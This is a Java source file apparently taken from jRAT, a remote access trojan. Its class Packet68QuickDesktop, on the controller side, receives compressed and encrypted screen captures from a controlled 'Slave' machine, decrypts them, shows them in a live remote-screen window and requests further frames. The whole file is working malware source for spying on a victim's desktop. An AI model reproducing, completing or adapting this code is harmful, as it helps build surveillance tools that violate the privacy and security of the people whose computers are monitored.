package pro.jrat.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.DataInputStream;

import pro.jrat.Slave;
import pro.jrat.common.compress.GZip;
import pro.jrat.common.crypto.Crypto;
import pro.jrat.ui.frames.FrameQuickRemoteScreen;
import pro.jrat.utils.ImageUtils;


public class Packet68QuickDesktop extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		FrameQuickRemoteScreen frame = FrameQuickRemoteScreen.instances.get(slave);
		
		int len = slave.readInt();
		
		byte[] buffer = new byte[len];
				
		slave.getDataInputStream().readFully(buffer);
		
		buffer = Crypto.decrypt(GZip.decompress(buffer), slave.getConnection().getKey());
		
		if (frame != null) {
			BufferedImage image = ImageUtils.decodeImage(buffer);
			
			frame.getImage().getGraphics().drawImage(image, 0, 0, frame.getImage().getWidth(), frame.getImage().getHeight(), null);
			
			frame.getLabel().repaint();
			
			frame.setSize(len / 1024);
			
			frame.getFPSThread().increase();
			
			if (frame.shouldContinue()) {
				frame.send();
			}
		}
	}

}
